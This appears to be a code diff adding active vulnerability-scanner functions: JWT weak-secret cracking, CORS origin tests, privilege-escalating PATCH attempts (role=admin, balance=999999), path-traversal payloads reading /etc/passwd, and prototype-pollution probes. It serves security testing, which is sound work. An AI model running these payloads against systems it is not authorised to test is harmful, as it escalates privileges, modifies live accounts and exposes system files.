@@ -7484,3 +7484,305 @@ def _run_laravel_secrets(apex_instance):
             except: pass
     with apex_instance._vuln_lock:
         apex_instance.vulnerabilities.extend({**f, "status": "VULNERABLE"} for f in findings)
+
+
+# ---------------------------------------------------------------------------
+# ELITE BATCH 10: JWT brute-force, CORS subdomain wildcard,
+#                 BOPLA, API key in URL, insecure file download,
+#                 mass assignment via PATCH, postMessage wildcard,
+#                 prototype pollution via path, GraphQL subscription
+# ---------------------------------------------------------------------------
+
+_WEAK_JWT_SECRETS = [
+    "secret", "password", "123456", "qwerty", "admin", "test", "key",
+    "jwt", "token", "auth", "changeme", "default", "pass", "1234",
+    "secret123", "password123", "mysecret", "jwtkey", "supersecret",
+    "your-256-bit-secret", "your-secret-key", "HS256", "HS512",
+    "access_token_secret", "refresh_token_secret", "app_secret",
+    "", "null", "undefined", "none",
+]
+
+def scan_jwt_secret_bruteforce(crawl_data):
+    """Brute-force weak JWT secrets — if cracked, forge admin tokens."""
+    import base64 as _b64, hmac as _hmac, hashlib as _hl, json as _j
+    findings = []
+    jwt_re = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
+
+    for page in crawl_data.get("pages", [])[:10]:
+        try:
+            r = _S.get(page["url"], timeout=5)
+            # Find JWTs in cookies, headers, body
+            sources = list(r.cookies.values()) + [r.headers.get("Authorization",""),
+                                                    r.headers.get("Set-Cookie",""), r.text[:3000]]
+            for src in sources:
+                for jwt in jwt_re.findall(str(src)):
+                    parts = jwt.split(".")
+                    if len(parts) != 3: continue
+                    try:
+                        pad = lambda s: s + "=" * (-len(s) % 4)
+                        header = _j.loads(_b64.urlsafe_b64decode(pad(parts[0])))
+                        alg = header.get("alg", "").upper()
+                        if alg not in ("HS256", "HS384", "HS512"): continue
+                        hash_fn = {"HS256": _hl.sha256, "HS384": _hl.sha384,
+                                   "HS512": _hl.sha512}.get(alg, _hl.sha256)
+                        msg = f"{parts[0]}.{parts[1]}".encode()
+                        sig = _b64.urlsafe_b64decode(pad(parts[2]))
+                        for secret in _WEAK_JWT_SECRETS:
+                            expected = _hmac.new(secret.encode(), msg, hash_fn).digest()
+                            if _hmac.compare_digest(expected, sig):
+                                payload = _j.loads(_b64.urlsafe_b64decode(pad(parts[1])))
+                                findings.append({
+                                    "type": "JWT Weak Secret (Cracked)",
+                                    "severity": "critical",
+                                    "url": page["url"],
+                                    "detail": f"JWT secret is '{secret}' — can forge tokens. Payload: {str(payload)[:100]}",
+                                    "template": "apex-jwt-crack",
+                                })
+                                break
+                    except: pass
+        except: pass
+    return findings
+
+
+def scan_cors_subdomain_wildcard(crawl_data, subdomains):
+    """CORS misconfiguration: wildcard subdomain allows attacker-controlled subdomains."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:10]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        host = urllib.parse.urlparse(base).netloc
+        domain_parts = host.split(".")
+        if len(domain_parts) < 2: continue
+        tld = ".".join(domain_parts[-2:])
+        # Test attacker-controlled subdomain
+        attacker_origin = f"https://evil.{tld}"
+        try:
+            r = _S.get(page["url"], timeout=5, headers={"Origin": attacker_origin})
+            acao = r.headers.get("Access-Control-Allow-Origin", "")
+            acac = r.headers.get("Access-Control-Allow-Credentials", "")
+            if acao == attacker_origin or (acao.endswith(tld) and "*" not in acao):
+                sev = "critical" if acac.lower() == "true" else "high"
+                findings.append({
+                    "type": "CORS Subdomain Wildcard",
+                    "severity": sev,
+                    "url": page["url"],
+                    "detail": f"Reflects subdomain origin {attacker_origin} — attacker can register evil.{tld}",
+                    "template": "apex-cors-subdomain",
+                })
+        except: pass
+        # Test null origin (sandboxed iframe)
+        try:
+            r = _S.get(page["url"], timeout=5, headers={"Origin": "null"})
+            if r.headers.get("Access-Control-Allow-Origin") == "null":
+                findings.append({
+                    "type": "CORS Null Origin",
+                    "severity": "high",
+                    "url": page["url"],
+                    "detail": "null origin accepted — sandboxed iframe attack possible",
+                    "template": "apex-cors-null",
+                })
+        except: pass
+    return findings
+
+
+def scan_bopla(crawl_data):
+    """Broken Object Property Level Authorization — set fields you shouldn't via PATCH/PUT."""
+    findings = []
+    priv_fields = {
+        "role": "admin", "isAdmin": True, "admin": True, "verified": True,
+        "active": True, "status": "active", "plan": "premium", "tier": "enterprise",
+        "creditLimit": 999999, "balance": 999999, "permissions": ["admin"],
+        "emailVerified": True, "phoneVerified": True, "kycVerified": True,
+    }
+    for page in crawl_data.get("pages", []):
+        url = page["url"]
+        # Look for user/profile/account endpoints
+        if not any(x in url.lower() for x in ["user", "profile", "account", "me", "settings"]):
+            continue
+        base = "/".join(url.split("/", 3)[:3])
+        for path in ["/api/me", "/api/user", "/api/profile", "/api/v1/me",
+                     "/api/v1/user", "/api/account", "/user/profile"]:
+            endpoint = f"{base}{path}"
+            try:
+                # Get baseline
+                r_get = _S.get(endpoint, timeout=5)
+                if r_get.status_code != 200: continue
+                baseline = r_get.text
+                # Try PATCH with privileged fields
+                for field, value in list(priv_fields.items())[:5]:
+                    r_patch = _S.request("PATCH", endpoint,
+                                        json={field: value}, timeout=5,
+                                        headers={"Content-Type": "application/json"})
+                    if r_patch.status_code in (200, 204):
+                        # Verify if field was actually set
+                        r_verify = _S.get(endpoint, timeout=5)
+                        if str(value).lower() in r_verify.text.lower() and str(value).lower() not in baseline.lower():
+                            findings.append({
+                                "type": f"BOPLA: Can Set '{field}' via PATCH",
+                                "severity": "critical",
+                                "url": endpoint,
+                                "detail": f"PATCH {field}={value} accepted and persisted — privilege escalation",
+                                "template": "apex-bopla",
+                            })
+                            break
+            except: continue
+    return findings
+
+
+def scan_api_key_in_url(crawl_data):
+    """Detect API keys passed as URL parameters — logged in server logs and Referer headers."""
+    findings = []
+    key_params = ("api_key", "apikey", "api-key", "key", "token", "access_token",
+                  "auth_token", "secret", "client_secret", "app_key", "appkey",
+                  "authorization", "bearer", "jwt", "session_token")
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            if p.lower() in key_params:
+                # Check if the value looks like a real key (not a placeholder)
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query)
+                val = qs.get(p, [""])[0]
+                if len(val) >= 16 and val not in ("YOUR_API_KEY", "API_KEY", "TOKEN", ""):
+                    findings.append({
+                        "type": f"API Key/Token in URL Parameter: {p}",
+                        "severity": "high",
+                        "url": url,
+                        "detail": f"Param '{p}' contains credential in URL — logged in server logs and Referer headers",
+                        "template": "apex-key-url",
+                    })
+    # Also check page URLs for tokens
+    for page in crawl_data.get("pages", []):
+        url = page["url"]
+        for param in key_params:
+            if f"{param}=" in url.lower():
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query)
+                for k, vals in qs.items():
+                    if k.lower() == param and vals and len(vals[0]) >= 16:
+                        findings.append({
+                            "type": f"Credential in URL: {k}",
+                            "severity": "high",
+                            "url": url,
+                            "detail": f"Token/key in URL parameter '{k}' — exposed in logs",
+                            "template": "apex-key-url",
+                        })
+    return findings
+
+
+def scan_insecure_file_download(crawl_data):
+    """Path traversal via file download parameters."""
+    findings = []
+    file_params = ("file", "filename", "path", "filepath", "download", "attachment",
+                   "doc", "document", "name", "resource", "asset", "f", "src")
+    traversal_payloads = [
+        "../../../etc/passwd",
+        "....//....//....//etc/passwd",
+        "..%2f..%2f..%2fetc%2fpasswd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "..\\..\\..\\windows\\win.ini",
+        "/etc/passwd",
+        "C:\\Windows\\win.ini",
+    ]
+    markers = ["root:x:", "root:*:", "[fonts]", "daemon:", "[extensions]"]
+
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            if p.lower() not in file_params: continue
+            for payload in traversal_payloads[:3]:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=_TIMEOUT)
+                    if any(m in r.text for m in markers):
+                        findings.append({
+                            "type": "Path Traversal via File Download",
+                            "severity": "critical",
+                            "url": test_url,
+                            "detail": f"File param '{p}' allows path traversal — reads /etc/passwd",
+                            "template": "apex-file-traversal",
+                        })
+                        break
+                except: continue
+
+    # Also test download endpoints
+    for page in crawl_data.get("pages", []):
+        url = page["url"]
+        if not any(x in url.lower() for x in ["download", "export", "file", "attachment"]):
+            continue
+        for payload in traversal_payloads[:2]:
+            for p in ("file", "path", "name", "filename"):
+                try:
+                    test_url = f"{url}?{p}={urllib.parse.quote(payload)}"
+                    r = _S.get(test_url, timeout=_TIMEOUT)
+                    if any(m in r.text for m in markers):
+                        findings.append({
+                            "type": "Path Traversal in Download Endpoint",
+                            "severity": "critical",
+                            "url": test_url,
+                            "detail": f"Download endpoint vulnerable to path traversal",
+                            "template": "apex-file-traversal",
+                        })
+                        break
+                except: continue
+    return findings
+
+
+def scan_prototype_pollution_path(crawl_data):
+    """Prototype pollution via URL path segments — /api/__proto__/polluted."""
+    findings = []
+    for page in crawl_data.get("pages", [])[:5]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        for path in ["/__proto__/polluted", "/constructor/prototype/polluted",
+                     "/api/__proto__/test", "/api/constructor/prototype/test"]:
+            try:
+                r = _S.get(f"{base}{path}", timeout=5)
+                if r.status_code == 200:
+                    body = r.text.lower()
+                    if "polluted" in body or "prototype" in body:
+                        findings.append({
+                            "type": "Prototype Pollution via URL Path",
+                            "severity": "high",
+                            "url": f"{base}{path}",
+                            "detail": "Server processes __proto__ in URL path — prototype pollution possible",
+                            "template": "apex-pp-path",
+                        })
+            except: pass
+    return findings
+
+
+def scan_mass_assignment_patch(crawl_data):
+    """Mass assignment via HTTP PATCH — often skips validation that POST has."""
+    findings = []
+    priv_fields = ["role", "admin", "isAdmin", "verified", "active", "plan",
+                   "creditLimit", "balance", "permissions", "emailVerified"]
+    for form in crawl_data.get("forms", []):
+        action = form.get("action", "")
+        if not action: continue
+        method = form.get("method", "").upper()
+        if method not in ("POST", "PUT"): continue
+        inputs = form.get("inputs", [])
+        try:
+            baseline_data = {i.get("name","f"): i.get("value","test") for i in inputs}
+            baseline = _S.post(action, json=baseline_data, timeout=5)
+            # Try PATCH with extra privileged fields
+            for field in priv_fields[:3]:
+                patch_data = dict(baseline_data)
+                patch_data[field] = "admin" if isinstance(field, str) else True
+                r = _S.request("PATCH", action, json=patch_data, timeout=5,
+                               headers={"Content-Type": "application/json"})
+                if r.status_code in (200, 201, 204):
+                    if r.text != baseline.text:
+                        findings.append({
+                            "type": f"Mass Assignment via PATCH: {field}",
+                            "severity": "high",
+                            "url": action,
+                            "detail": f"PATCH accepts privileged field '{field}' — POST may not",
+                            "template": "apex-mass-patch",
+                        })
+                        break
+        except: continue
+    return findings
